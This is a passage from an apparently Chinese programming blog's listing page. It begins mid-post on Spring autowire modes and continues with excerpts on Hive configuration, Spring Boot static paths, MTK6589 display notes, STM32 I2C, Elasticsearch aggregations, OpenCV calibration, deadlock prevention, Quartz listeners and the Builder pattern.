&lt;bean id="xxx" class="com.xxx...Xxx" autowire="byName"&gt;&lt;/bean&gt;
&lt;bean id="userService" class="com.xxx...UserService"&gt;&lt;/bean&gt;
此处Xxx中的变量userService的名字和配置文件中UserService的bean的id一致
3、byType：根据实例变量类型自动装载
按照类型个什么的变量的类型，在容器管理处找到变量类型相同的bean的定义，找到之后自动绑定
public class Xxx{
private UserService userService；
}
&lt;bean id="xxx" class="com.xxx...Xxx" autowire="byType"&gt;&lt;/bean&gt;
&lt;bean id="userService1" class="com.xxx...UserService"&gt;&lt;/bean&gt; 此时Xxx中的变量名userService可以和配置文件中的UserService的bean的id不一致，因为此时是根据类型绑定的，但是如果出现两个或多个同类型的bean定义，将出错，需要自己手动指定
4、constructor：根据构造方法参数类型自动装载
public class Xxx{
private UserService userService；
public Xxx(UserService userService){
this.userService = userService;
}
}
&lt;bean id="xxx" class="com.xxx...Xxx" autowire="constractor"&gt; &lt;/bean&gt; &lt;bean id="userService1" class="com.xxx...UserService"&gt;&lt;/bean&gt; 这个跟 byType装载有些相似，如果容器中出现两个相同UserService类型的对象，就会报错
5、autodetect：byType方式和constructor方式结合
text-transform: none; white-space: no如果对象拥有默认无参数的构造方法，容器会优先考虑byType的自动绑定模式。否则，会使用constructor模式。当然，如果通过构造方法注入绑定后还有其他属性没有绑定，容器也会使用byType对剩余的对象属性进行自动绑定。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48ef299ad8d25c36c32cde412e96860c/" rel="bookmark">
			Relative path in absolute URI: ${system:java.io.tmpdir%7D/$%7Bhive.session.id%7D_resources
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原因：环境变量设置问题
&lt;property&gt;
&lt;name&gt;Hive.exec.local.scratchdir&lt;/name&gt;
&lt;value&gt;${system:Java.io.tmpdir}/${system:user.name}&lt;/value&gt;
&lt;description&gt;Local scratch space for hive jobs&lt;/description&gt;
&lt;/property&gt;
&lt;property&gt;
&lt;name&gt;hive.downloaded.resources.dir&lt;/name&gt;
&lt;value&gt;${system:java.io.tmpdir}/${hive.session.id}_resources&lt;/value&gt;
&lt;description&gt;Temporary local directory for added resources in the remote file system.&lt;/description&gt;
&lt;/property&gt;
&lt;property&gt;
解决方案如下：
1.查看hive-site.xml配置，会看到配置值含有"system:java.io.tmpdir"的配置项
2.新建文件夹/home/grid/hive-0.14.0-bin/iotmp
3.将含有"system:java.io.tmpdir"的配置项的值修改为如上地址
启动hive，成功！
启动情况如下：
$ ./hive
Logging initialized using configuration in jar:file:/home/grid/hive-0.14.0-bin/lib/hive-common-0.14.0.jar!/hive-log4j.properties
hive&gt; 转载于:https://www.cnblogs.com/wmcoder/p/7099235.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/611015ea941c84ad994589e0129a606d/" rel="bookmark">
			springboot、springcloud之静态资源路径的配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		静态资源路径是指系统可以直接访问的路径，且路径下的所有文件均可被用户直接读取。 在Springboot中默认的静态资源路径有：classpath:/METAINF/resources/，classpath:/resources/，classpath:/static/，
classpath:/public/，从这里可以看出这里的静态资源路径都是在classpath中（也就是在项目路径下指定的这几个文件夹）
试想这样一种情况：一个网站有文件上传文件的功能，如果被上传的文件放在上述的那些文件夹中会有怎样的后果？
网站数据与程序代码不能有效分离；当项目被打包成一个.jar文件部署时，再将上传的文件放到这个.jar文件中是有多么低的效率；网站数据的备份将会很痛苦。 此时可能最佳的解决办法是将静态资源路径设置到磁盘的基本个目录。
在Springboot中可以直接在配置文件中覆盖默认的静态资源路径的配置信息：
application.properties配置文件如下： server.port=1122 web.upload-path=D:/temp/study13/ spring.mvc.static-path-pattern=/** spring.resources.static-locations=classpath:/META-INF/resources/,classpath:/resources/,\ classpath:/static/,classpath:/public/,file:${web.upload-path} 注意：web.upload-path这个属于自定义的属性，指定了一个路径，注意要以/结尾；
spring.mvc.static-path-pattern=/**表示所有的访问都经过静态资源路径；
spring.resources.static-locations在这里配置静态资源路径，前面说了这里的配置是覆盖默认配置，所以需要将默认的也加上否则static、public等这些路径将不能被当作静态资源路径，在这个最末尾的file:${web.upload-path}之所有要加file:是因为指定的是一个具体的硬盘路径，其他的使用classpath指的是系统环境变量
编写测试类上传文件 package com.zslin; import org.junit.Test; import org.junit.runner.RunWith; import org.springframework.beans.factory.annotation.Value; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.test.context.junit4.SpringRunner; import org.springframework.util.FileCopyUtils; import java.io.File; /** * Created by 钟述林 393156105@qq.com on 2016/10/24 0:44. */ @SpringBootTest @RunWith(SpringRunner.class) public class FileTest { @Value("${web.upload-path}") private String path; /** 文件上传测试 */ @Test public void uploadTest() throws Exception { File f = new File("D:/pic.jpg"); FileCopyUtils.copy(f, new File(path+"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/611015ea941c84ad994589e0129a606d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb4c83b9d574fc1c4d8629d8a507a50c/" rel="bookmark">
			mtk6589显示子系统笔记（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		拿到MT6589的版本不久，发现显示系统代码结构改变很大。做些备忘，后续不忙的时候可以继续看。
MT6589之前的MTK的Android系统显示系统同featurePhone基本一致。
先来回顾下ＭＴＫ之前版本的大致结构，每个Video层，每个UI层　分别对应一个layer，再通过设置一些，区域坐标，透明度，通透色等，然后启动显示模块的DMA，实现各layer的数据的叠加，。如果是CPU接口的屏，合并后的数据往 GRAM刷，如果是RGB接口的数据，那么往ＤＤＲ内存中的显存刷，然后ＲＧＢ控制器自动从显存来取。　ＭＴ6589平台，把显示系统分成很多模块。
包括，rotator模块，scaler模块，gamrer模块，RDMA模块，WDMA模块，BLS模块。
各种LCD接口模块（DPI，DBI， DSI）。
各个模块的功能从名字上就可以看出来。
无非就是颜色转换，角度转换，数据叠加等。每个模块的具体功能和寄存器数据手册上写的很详细。暂时没有必要去详细了解。
当前目的是先了解框架，以后有问题可以定位再深入。
如上图就是整个显示子系统的框图。上图中的蓝色箭头指向内存。
其中 ：RDMA用来准备数据给DPI DSI DBI接口引擎（顾名思义read DMA）
rdma 输入支持两种模式：
1. direct link input mode :指的是RDAM的数据源是上级的子模块（例如overlayer 模块）
2. memory link input mode: 指的是RDAM的数据来自内存。
rdma 的输出都是给显示接口DPI 、DSI 或者DBI。
-------
MT6589有两个RDMA。
RDMA0支持从内存输入和输出给显示接口
RDMA1只支持内存输入。
如上图中的红色虚线框部分为RDMA
------------------------------
WDMA： Write DMA 。从框图可以看到都是将前面几个模块产生显示buffer 写入到内存中的。
BLS ： 自动背光调节，根据显示的数据来决定给背光占空比的一种方式，可以节省电源消耗，例如黑色部分可以降低背光亮度。省电。
overlayer : 从内存中或者前级模块的输出通过透明度、区域设置、等叠加，输出为一个显存。 这个也是核心部件。
2 。
再来分析如何使用这些模块刷新一个图片。 按照惯例，boot 模块（LK）只是刷一个logo，代码会比较简单，方便了解简单使用流程，后续有空再看kernel .
初始化
Platform.c (bootable\bootloader\lk\platform\mediatek\mt6589\lk) --》void platform_early_init(void)
首先找到显示系统要用地址：（从下面可以看到和以前平台一样把内存中最后一段区域的作为显存）
---------------------
下面就是调用显示初始化：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb4c83b9d574fc1c4d8629d8a507a50c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/368ef233db80b9a99b4607640ffc181d/" rel="bookmark">
			stm32 I2C自收发测试例程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		define BufferSize 4 define I2C2_SLAVE_ADDRESS7 0x30 /* Private macro ————————————————————-*/ /* Private variables ———————————————————*/
vu8 I2C1_Buffer_Tx[BufferSize] = {1, 2, 3, 4}; /* I2C1待发送字节数组 */ vu8 I2C2_Buffer_Rx[BufferSize] = {0, 0, 0, 0}; /* I2C2待接收字节缓冲 */ vu8 Tx_Idx = 0; /* I2C1数据发送计数变量 */ vu8 Rx_Idx = 0; /* I2C2数据接收计数变量 */ /* 自定义参数宏 ——————————————————-*/
define I2C1_SLAVE_ADDRESS7 0x30 /* 定义 I2C1 本地地址为0x30 */ define I2C2_SLAVE_ADDRESS7 0x30 /* 定义 I2C2 本地地址为0x30 */ define BufferSize 4 /* 自定义函数宏 ——————————————————-*/
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/368ef233db80b9a99b4607640ffc181d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/edf172b927e11571cb8d40c2ee7d99d8/" rel="bookmark">
			elasticsearch java实现类似sql group by
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习es查询总是想往sql方面靠齐，学习了一段时间，总结一些如下
BoolQueryBuilder boolQueryBuilder = QueryBuilders.boolQuery(); //添加时间范围过滤 boolQueryBuilder.must(QueryBuilders.rangeQuery("@timestamp").format("yyyy-MM-dd HH:mm:ss").gte(conditionMap.get("createTimeB")).lte(conditionMap.get("createTimeE"))); AggregationBuilder aggregationBuilder = AggregationBuilders .terms(查询字段别名).field(分组字段) .order(Terms.Order.aggregation(ES_COUNT_ALIAS, false)) .size(10) .subAggregation(AggregationBuilders.count(统计字段别名).field(统计的字段)); SearchRequestBuilder searchRequestBuilder = ElasticsearchHelper.getInstance().getClient().prepareSearch(ES_INDEX).setTypes(ES_TYPE) .setQuery(boolQueryBuilder) .addAggregation(aggregationBuilder) .setSize(0); SearchResponse sr = searchRequestBuilder.execute().actionGet(); Terms genders = sr.getAggregations().get(统计字段别名); for (Terms.Bucket entry : genders.getBuckets()) { list.add((String) entry.getKey()+"-("+entry.getDocCount()+")"); }现在对上面进行修改，例如想group by 时间，并且按天来进行分组 AggregationBuilder aggregation = AggregationBuilders .dateHistogram("agg") .field("@timestamp") .format("yyyy-MM-dd") .dateHistogramInterval(DateHistogramInterval.DAY);然后现在可能有新需求，group by 时间，姓名 AggregationBuilder nameAgg = AggregationBuilders.terms(姓名别名).field(姓名).size(10); aggregation.subAggregation(nameAgg);如果可以能需要进行名称统计，但是需要distinct nameAgg.subAggregation(AggregationBuilders.cardinality(别名).field(姓名)) 其他的总结如下
（1）统计某个字段的数量 ValueCountBuilder vcb= AggregationBuilders.count("count_uid").field("uid"); （2）去重统计某个字段的数量（有少量误差） CardinalityBuilder cb= AggregationBuilders.cardinality("distinct_count_uid").field("uid"); （3）聚合过滤 FilterAggregationBuilder fab= AggregationBuilders.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/edf172b927e11571cb8d40c2ee7d99d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b0de2e0572534e72c872ffff70767a7/" rel="bookmark">
			eclipse 配置信息迁移
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		###eclipse 如何导出配置信息并且迁移 1. 将原工作空间下面的metadata/.plugins/org.eclipse.core.runtime/.settings拷贝到新工作区间下的metadata/.plugins/org.eclipse.core.runtime/.settings即可
转载于:https://my.oschina.net/u/1988355/blog/1052733
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7aaec3e5a390aa39e790fd20f1a66f93/" rel="bookmark">
			Codeforces#420 C. Okabe and Boxes
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C. Okabe and Boxes Okabe and Super Hacker Daru are stacking and removing boxes. There are n boxes numbered from 1 to n. Initially there are no boxes on the stack.
Okabe, being a control freak, gives Daru 2*n* commands: n of which are to add a box to the top of the stack, and n of which are to remove a box from the top of the stack and throw it in the trash.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7aaec3e5a390aa39e790fd20f1a66f93/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9fa8520b401fb0cb47cb84ad00c03ee/" rel="bookmark">
			【OpenCV3学习笔记 】相机标定函数 calibrateCamera( ) 使用详解（附相机标定程序和数据）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		函数作用： 根据校准模式的几个视图（也就是相机拍的几张不同的图片），求解摄像机的内在参数和外在参数。 在每个视图中，必须指定三维物体点及其相应的二维投影的坐标。这可以通过使用已知几何形状和易于检测特征点的对象来实现。这样的对象称为标定或校准模式，而且OpenCV有对棋盘标定的内置支持（见findchessboardcorners）。目前，固有参数的初始化（当cv_calib_use_intrinsic_guess未设置）只实现平面校准模式（对象点的z坐标，必须全部为零）。 只要提供初始相机内参矩阵cameramatrix，也可以用于三维标定装置。
该算法执行以下步骤： 计算初始的内在参数（只能用于平面校准模式的选项）或从输入参数中读取它们。畸变系数都为零开始，除非有cv_calib_fix_k指定。 估计初始相机的姿态，就像内在参数已经已知一样。这是通过使用solvepnp。 运行的全局Levenberg Marquardt优化算法来最小化投影误差，投影误差等于所提取到的图像上的特征点坐标和三维点根据使用相机的参数和姿态计算得到的图像上的投影坐标的距离的综合。
函数原型：（opencv3帮助文档） double cv::calibrateCamera ( InputArrayOfArrays objectPoints, InputArrayOfArrays imagePoints, Size imageSize, InputOutputArray cameraMatrix, InputOutputArray distCoeffs, OutputArrayOfArrays rvecs, OutputArrayOfArrays tvecs, OutputArray stdDeviationsIntrinsics, OutputArray stdDeviationsExtrinsics, OutputArray perViewErrors, int flags = 0, TermCriteria criteria = TermCriteria(TermCriteria::COUNT+TermCriteria::EPS, 30, DBL_EPSILON) ) double cv::calibrateCamera ( InputArrayOfArrays objectPoints, InputArrayOfArrays imagePoints, Size imageSize, InputOutputArray cameraMatrix, InputOutputArray distCoeffs, OutputArrayOfArrays rvecs, OutputArrayOfArrays tvecs, int flags = 0, TermCriteria criteria = TermCriteria(TermCriteria::COUNT+TermCriteria::EPS, 30, DBL_EPSILON) ) 参数 objectPoints ：世界坐标系中的点。在使用时，应该输入vector&lt; vector&lt; Point3f &gt; &gt;。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9fa8520b401fb0cb47cb84ad00c03ee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f85d93fbfbc3189a8e1ae929a48a0ee9/" rel="bookmark">
			文本情感分类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		电影文本情感分类 Github地址 Kaggle地址
这个任务主要是对电影评论文本进行情感分类，主要分为正面评论和负面评论，所以是一个二分类问题，二分类模型我们可以选取一些常见的模型比如贝叶斯、逻辑回归等，这里挑战之一是文本内容的向量化，因此，我们首先尝试基于TF-IDF的向量化方法，然后尝试word2vec。
# -*- coding: UTF-8 -*- import pandas as pd import numpy as np import re from bs4 import BeautifulSoup def review_to_wordlist(review): ''' 把IMDB的评论转成词序列 参考：http://blog.csdn.net/longxinchen_ml/article/details/50629613 ''' # 去掉HTML标签，拿到内容 review_text = BeautifulSoup(review, "html.parser").get_text() # 用正则表达式取出符合规范的部分 review_text = re.sub("[^a-zA-Z]"," ", review_text) # 小写化所有的词，并转成词list words = review_text.lower().split() # 返回words return words 载入数据集 # 载入数据集 train = pd.read_csv('/Users/frank/Documents/workspace/kaggle/dataset/Bag_of_Words_Meets_Bags_of_Popcorn/labeledTrainData.tsv', header=0, delimiter="\t", quoting=3) test = pd.read_csv('/Users/frank/Documents/workspace/kaggle/dataset/Bag_of_Words_Meets_Bags_of_Popcorn/testData.tsv', header=0, delimiter="\t", quoting=3) print train.head() print test.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f85d93fbfbc3189a8e1ae929a48a0ee9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/429bfb4f056e66dfb2ebbe2931bf8166/" rel="bookmark">
			codeforces round#420
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		a题：
time limit per test 2 seconds memory limit per test 256 megabytes input standard input output standard output Okabe needs to renovate the Future Gadget Laboratory after he tried doing some crazy experiments! The lab is represented as an n by n square grid of integers. A good lab is defined as a lab in which every number not equal to 1 can be expressed as the sum of a number in the same row and a number in the same column.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/429bfb4f056e66dfb2ebbe2931bf8166/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89a9449b6e53395dec2be89ecd1947a4/" rel="bookmark">
			处理死锁和预防死锁的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 处理死锁的基本方法 目前，处理死锁的方法可归结为以下四种： 1）预防死锁。这是一种较为简单和直观的事先预防的方法。该方法是通过设置某些限制条件，去破坏产生死锁的四个必要条件中的一个或几个条件，来预防发生死锁。预防死锁是一种较易实现的方法，已被广泛使用。但由于所施加的限制条件往往太严格，因而可能导致系统资源利用率和系统吞吐量降低。 2）避免死锁。该方法同样是属于事先预防策略，但它并不需要事先采取各种限制措施去破坏产生死锁的四个必要条件，而是在资源的动态分配过程中，用某种方法去防止系统进入不安全状态，从而避免发生死锁。这种方法只需事先施加较弱的限制条件，便可获得较高的资源利用率及系统吞吐量，但在实现上有一定的难度。目前在较完善的系统中常用此方法来避免发生死锁。 3)检测死锁。这种方法并不需要事先采取任何限制性措施，也不必检查系统是否已经进入不安全区，而是允许系统在运行过程中发生死锁。但可通过系统所设置的检测机构，及时的检测出死锁的发生，并精确的确定与死锁有关的进程和资源；然后采取适当措施从系统中将已发生的死锁清除掉。 4）解除死锁。这是与检测死锁相配套的一种措施。当检测到系统中已经发生死锁时，将进程从死锁状态中解脱出来。常用的方法是撤销或挂起一些进程，以便回收一些资源，再将这些资源分配给已经处于阻塞状态的进程，使之转为就绪态，以继续运行。死锁的检测和解除措施有可能使系统获得较好的资源利用率和吞吐量，但是实现上难度也最大。
预防死锁的基本方法 预防死锁和避免死锁这两种方法实质上都是通过施加某些限制条件，来预防发生死锁。两者的主要差别在于：为预防死锁所施加的限制条件比较严格，这往往会影响进程的并发执行；而为避免死锁所加的限制条件则比较宽松，这给进程的运行提供了较宽松的环境，有利于进程的并发。
一、预防死锁 预防死锁的方法是使四个必要条件中的第2、3、4个条件之一不能成立，来避免发生死锁。至于必要条件1，因为它是由设备的固有特性所决定的，不仅不能改变，还应加以保证。 1）摒弃“请求和保持”条件 在采用这种方法时，系统规定所有进程在开始运行之前，都必须一次性的申请其在整个运行过程所需的全部资源。此时，若系统有足够的资源分配给某进程，便可把其需要的所有资源分配给进程，这样，该进程在整个运行期间便不会再提出资源要求，从而摒弃了请求条件。但在分配资源时，只要有一种资源不能满足某进程的要求，即使其它所需各资源都空闲，也不分配给该进程，而让该进程等待。由于在该进程的等待期间，它并未占用任何资源，因而也摒弃了保持条件，从而避免发生死锁。 这种方法的缺点是：首先表现为资源被严重浪费，因为一个进程是一次性地获得其整个运行过程中所需的全部资源的，且独占资源，其中可能有些资源很少用，甚至在整个运行期间都未使用，这就严重的恶化了系统资源的利用率；其次是使进程延迟运行，仅当进程在获得了其所需的全部资源后，才能开始运行，但可能因有些资源已长期被其它进程占用而使等待该资源的进程迟迟不能运行。 2）摒弃“不剥夺”条件 在采用这种方法时系统规定，进程是逐个地提出对资源的要求的。当一个已经保持了某些资源的进程，再提出新的资源请求而不能立即满足时，必须释放它已经保持了的所有资源，待以后需要时再重新申请。这意味着某一进程已经占有的资源，在运行过程中会被占时释放掉，也可认为是被剥夺了，从而摒弃了“不剥夺”条件。 3）摒弃“环路等待”条件 这种方法中规定，系统将所有资源按类型进行线性排队，并赋予不同的序号。例如，令输入机的序号为1，打印机的序号为2，磁带机为3，磁盘为4.所有进程对资源的请求必须严格按照资源序号递增的次序提出，这样，在所形成的资源分配图中，不可能再出现环路，因而摒弃了“环路等待”条件。
二、系统安全状态 在该方法中把系统的状态分为安全状态和不安全状态，只要能使系统始终处于安全状态，便可避免发生死锁。
1.安全状态 在避免死锁的方法中，允许进程动态的申请资源，但系统在进行资源分配之前，应先计算此次资源分配的安全性。若此次分配不会导致系统进入不安全状态，则将资源分配给进程，否则，令进程等待。 所谓安全状态，是指系统能按某种进程顺序（P1,P2,……,Pn）（称&lt;“P1,P2,…,Pn&gt;序列为安全序列），来为每个进程Pi分配其所需资源，直至满足每个进程对资源的最大需求，使每个进程都可以顺利完成。如果系统无法找到这样一个安全序列，则称系统处于不安全状态。 虽然并非所有的不安全状态都必然会转为死锁状态，但当系统进入不安全状态后，便有可能进而进入死锁状态；反之，只要系统处于安全状态，系统便可避免进入死锁状态。因此，避免死锁的实质在于：系统在进行资源分配时，如何使系统不进入不安全状态。
2.安全状态之例 假定系统中有三个进程P1、P2和P3，共有12台磁带机。进程P1总共要求10台磁带机，P2和P3分别要求4台和9台。假设在T0时刻，进程P1、P2和P3已分别获得5台、2台和2台磁带机，尚有3台空闲未分配，如下表所示： 经分析发现，在T0时刻系统是安全的，因为这时存在一个安全序列《P2,P1,P3》，即只要系统按此进程序列分配资源，就能使每个进程都顺利完成。例如，将剩余的磁带机取2台分配给P2，使之继续运行，待P2完成，便可释放出4台磁带机，于是可用资源增至5台；以后再将这些全部分配给进程P1，使之运行，待P1完成后，将释放出10台磁带机，P3便能获得足够的资源，从而使P1、P2、P3每个进程都能顺利完成。
3.由安全状态向不安全状态的转换。 如果不按照安全序列分配资源，则系统可能会由安全状态进入不安全状态。例如在T0时刻以后，P3又请求1台磁带机，若此时系统把剩余3台中的1台分配给P3，则系统便进入不安全状态。因为此时无法再找到一个安全序列，例如，把剩余的2台分配给P2，这样，在P2完成后只能释放出4台，既不能满足P1尚需5台的要求，也不能满足P3尚需6台的需求，致使它们都无法推进前行，彼此都在等待对方释放资源，即陷入僵局，结果导致死锁。类似地，如果我们将剩余的两台磁带机先分配给P1或P3，也同样都无法使它们推进完成，因此，从给P3分配了第三台磁带机开始，系统便又进入了不安全状态。由此可见，在P3请求资源时，尽管系统中尚有可用的磁带机，但却不能分配给它，必须让P3一直等待到P1和P2完成，释放出资源后再将足够的资源分配给P3，它才能顺利完成。
三、利用银行家算法避免死锁 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1282b43352d42ff43304c3e6018c6861/" rel="bookmark">
			com.microsoft.sqlserver.jdbc.SQLServerException: 将截断字符串或二进制数据。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		org.springframework.dao.DataIntegrityViolationException: ### Error updating database. Cause: com.microsoft.sqlserver.jdbc.SQLServerException: 将截断字符串或二进制数据。 ### The error may involve ParkEnDaySum.save-Inline ### The error occurred while setting parameters ### SQL: insert into tbl_ParkEnDaySum ( station,ldate,parkcnt,centercnt,verifycode,resendflag,sendtime,receivetime,transflag ) values ( ?,?,?,?,?,?,?,?,? ) ### Cause: com.microsoft.sqlserver.jdbc.SQLServerException: 将截断字符串或二进制数据。 ; SQL []; 将截断字符串或二进制数据。; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: 将截断字符串或二进制数据。 at org.springframework.jdbc.support.SQLStateSQLExceptionTranslator.doTranslate(SQLStateSQLExceptionTranslator.java:102) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:73) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:75) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:447) at com.sun.proxy.$Proxy34.insert(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.insert(SqlSessionTemplate.java:279) at com.hgits.he.data.dao.impl.ParkEnDaySumDaoImpl.insert(ParkEnDaySumDaoImpl.java:14) at com.hgits.he.service.impl.ParkEnDaySumServiceImpl.insert(ParkEnDaySumServiceImpl.java:21) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1282b43352d42ff43304c3e6018c6861/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f8d3b5ebeec2555093515096f24f83f/" rel="bookmark">
			js:利用for循环，输出1-10所有数的平方和(即1-10的阶乘)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;输出1-10所有数的平方和&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var i; var j; var sum = 0; for(i = 1;i &lt;= 10;i++){ j= i*i; sum = sum + j; } alert(sum) &lt;/script&gt; &lt;/html&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9adc5a739d8e58bb9db5afa08441708d/" rel="bookmark">
			Quartz任务调度(4)JobListener分版本超详细解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在《spring学习笔记(15)趣谈spring 事件：实现业务逻辑解耦，异步调用提升用户体验》我们通过实例分析讲解了spring的事件机制，或许你会觉得其中的配置略显繁琐，而在Quartz框架中，它为我们集成了强大的事件机制，轻松地帮助我们在任务调度中完成各类辅佐操作，高内聚而耦合。 相对spring的事件实现，quartz这边简化了许多，我们只需： 1. 自定义监听器接口实现类 2. 向scheduler中注册监听器实现类
只需以上两步即可我完成我们的事件监听。对于监听器实现类中，可能有些方法不是我们需要的，这时候我们只需给出空实现即可。在Quartz中，监听器类型主要分为三种，和Quartz三个核心类相对应：JobListener,TriggerListener,SchedulerListener。下面我们先分析JobListener的使用方法。其他两种监听器留待后面系列文章详解
JobListener 我们的jobListener实现类必须实现其以下方法：
方法 说明 getName() getName() 方法返回一个字符串用以说明 JobListener 的名称。对于注册为全局的监听器，getName() 主要用于记录日志，对于由特定 Job 引用的 JobListener，注册在 JobDetail 上的监听器名称必须匹配从监听器上 getName() 方法的返回值。 jobToBeExecuted() Scheduler 在 JobDetail 将要被执行时调用这个方法。 jobExecutionVetoed() Scheduler 在 JobDetail 即将被执行，但又被 TriggerListener 否决了时调用这个方法。 jobWasExecuted() Scheduler 在 JobDetail 被执行之后调用这个方法。 接下来我们以《Quartz任务调度(1)概念例析快速入门》一文中的定时扒取新闻任务和获得最热新闻任务为例，分析我们的监听器方法。
1. 自定义监听器接口实现类 public class MyJobListener implements JobListener { @Override//相当于为我们的监听器命名 public String getName() { return "myJobListener"; } @Override public void jobToBeExecuted(JobExecutionContext context) { System.out.println(getName() + "触发对"+context.getJobDetail().getJobClass()+"的开始执行的监听工作，这里可以完成任务前的一些资源准备工作或日志记录"); } @Override//“否决JobDetail”是在Triiger被其相应的监听器监听时才具备的能力 public void jobExecutionVetoed(JobExecutionContext context) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9adc5a739d8e58bb9db5afa08441708d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b7f3065f71c3d816c80f05da36abc22/" rel="bookmark">
			Builder模式——项目中最常见的设计模式之一
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Builder模式介绍 Builder模式是一种一步一步创建一个复杂对象的设计模式，我认为这种设计模式的精髓就主要有两点：其一，用户使用简单，并且可以在不需要知道内部构建细节的情况下，就可以构建出复杂的对象模型；其二，对于设计者来说，这是一个解耦的过程，这种设计模式可以将构建的过程和具体的表示分离开来。
Builder模式的使用场景 1.相同的方法，不同的执行顺序，产生不同的时间结果时。 2.多个部件或零件，都可以装配到一个对象中，但是产生的运行结果又不同时。 3.产品类非常复杂，或者产品类中的调用顺序不同产生了不同的作用，这个时候用建造者模式非常适合。 4.当初始化一个对象特别复杂，如参数多，切很多参数都具有默认值时。 Builder模式分析 我们为什么要把代码的构建和表示分离开来？1.增加代码的可读性；2.方便维护。举一个例子，安卓中非常常用的AlertDialog就是Builder模式，我们知道，一个Dialog可以有非常多的属性和参数，例如title，icon，message， positiveButton，negativeButton等十几个参数，如果这些参数都放在构造函数里，那么这个方法将会有很多参数，为了完成这个函数，需要一次性准备好所有的参数，很容易写着写着就乱了。同时为了适配，还需要写很多重载的构造函数，类会很乱。而如果使用builder模式，不需要一次性准备好所有的参数，完全可以一个一个准备，代码易懂，方便非常多。 举例说明 有一个Person类，有name，age，job，sex等等N多属性，这里我用s1，s2，s3...s10代替。 接下来在Person类的内部定义一个静态的Builder类，并且定义对应的s1-s10方法，方法返回类型都是Builder 最后，增加一个build()方法，将所有的属性都设置进去 这样，含有多个参数的Builder模式的Person类就完成了，接下来我们看看用法。 